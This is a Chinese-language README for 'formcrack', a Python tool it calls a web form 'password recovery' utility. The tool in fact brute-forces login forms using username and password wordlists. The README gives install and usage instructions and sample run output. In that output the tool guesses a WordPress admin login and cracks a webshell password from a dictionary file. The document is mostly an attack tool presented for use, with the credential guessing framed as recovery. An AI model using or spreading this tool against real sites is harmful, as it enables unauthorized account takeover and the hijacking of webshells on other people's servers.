# formcrack

一个简单的 web 表单密码找回工具, 自动识别用户名与密码字段, 可以对 webshell 与网站进行密码找回 : )

## 开发与运行环境

* python 2.7.10
* requests
* BeautifulSoup4

## 如何安装与运行

### 安装

```bash
$ pip install requests BeautifulSoup4

```

### 运行

```bash
$ python fromcrack.py

usage: fromcrack.py [-h] -s URL [-a ACTION] [-t TIME] [-v] [-u U] [-U U]
                    [-p P] [-P P]

fromcrack.py: error: argument -s is required
```

## 命令行参数说明

1. -s
> 登陆地址, 如: http://目标/admin/login.php

1. -a
> 表单提交的 action 地址, 指定表单提交地址.

1. -t
> 延时请求, 单位(秒).

1. -v
> 显示详细找回账号过程信息.

1. -u
> (小写的u)指定一个用户名

1. -U
> (大写的U)指定一个用户名列表文件

1. -p
> (小写的p)指定一个密码

1. -P
> (大写的P)指定一个密码列表文件

## 命令行参数演示

找回 wrodpress 账号与密码, 并且每次延时两秒

```bash
$ python fromcrack.py -s http://172.16.213.179/wp-login.php -p admin123 -v -t 2
target: [http://172.16.213.179/wp-login.php], user count: [10], password count: [1] ...
[*] Test error data: [log=gkhrj&pwd=ubvasefy&rememberme=forever&wp-submit=%E7%99%BB%E5%BD%95&redirect_to=http%3A%2F%2F172.16.213.179%2Fwp-admin%2F&testcookie=1]
[*] send crack data package: log=admin&pwd=admin123&rememberme=forever&wp-submit=%E7%99%BB%E5%BD%95&redirect_to=http%3A%2F%2F172.16.213.179%2Fwp-admin%2F&testcookie=1
[+] == successful, user: [admin], password: [admin123] ==
```

找回 webshell 密码

```bash
python fromcrack.py -s http://172.16.213.179/phpspy.php -P ./dict/webshell.txt -v
target: [http://172.16.213.179/phpspy.php], user count: [10], password count: [1544] ...
[*] Test error data: [spiderpass=xoykuplw&submit=%B7%A8%BF%CD%D0%A1%D7%E9%D1%A7%CF%B0%BD%BB%C1%F7%D7%A8%D3%C3]
[*] send crack data package: spiderpass=pass&submit=%B7%A8%BF%CD%D0%A1%D7%E9%D1%A7%CF%B0%BD%BB%C1%F7%D7%A8%D3%C3
[*] send crack data package: spiderpass=598971996&submit=%B7%A8%BF%CD%D0%A1%D7%E9%D1%A7%CF%B0%BD%BB%C1%F7%D7%A8%D3%C3
[*] send crack data package: spiderpass=adminyouge&submit=%B7%A8%BF%CD%D0%A1%D7%E9%D1%A7%CF%B0%BD%BB%C1%F7%D7%A8%D3%C3
[*] send crack data package: spiderpass=sbadmin&submit=%B7%A8%BF%CD%D0%A1%D7%E9%D1%A7%CF%B0%BD%BB%C1%F7%D7%A8%D3%C3
[*] send crack data package: spiderpass=mkak5cpa&submit=%B7%A8%BF%CD%D0%A1%D7%E9%D1%A7%CF%B0%BD%BB%C1%F7%D7%A8%D3%C3
[*] send crack data package: spiderpass=040627&submit=%B7%A8%BF%CD%D0%A1%D7%E9%D1%A7%CF%B0%BD%BB%C1%F7%D7%A8%D3%C3
[*] send crack data package: spiderpass=123&submit=%B7%A8%BF%CD%D0%A1%D7%E9%D1%A7%CF%B0%BD%BB%C1%F7%D7%A8%D3%C3
[*] send crack data package: spiderpass=xx&submit=%B7%A8%BF%CD%D0%A1%D7%E9%D1%A7%CF%B0%BD%BB%C1%F7%D7%A8%D3%C3
[*] send crack data package: spiderpass=987987&submit=%B7%A8%BF%CD%D0%A1%D7%E9%D1%A7%CF%B0%BD%BB%C1%F7%D7%A8%D3%C3
[*] send crack data package: spiderpass=adminasb&submit=%B7%A8%BF%CD%D0%A1%D7%E9%D1%A7%CF%B0%BD%BB%C1%F7%D7%A8%D3%C3
[*] send crack data package: spiderpass=admin&submit=%B7%A8%BF%CD%D0%A1%D7%E9%D1%A7%CF%B0%BD%BB%C1%F7%D7%A8%D3%C3
[+] == successful, password: [admin] ==
```

## 待开发完善功能

* 验证码提醒与跳过
* 加入了错误信息判断功能，即输入密码错误的时候，从dic/error.txt文件里面读取错误的提示进行判断，原来的方式有bug,没有进行错误信息判断，随便读取一个密码都认为是正确的密码。
第264行 status_error=content.count(error_info) #计算error_info字符出现的次数
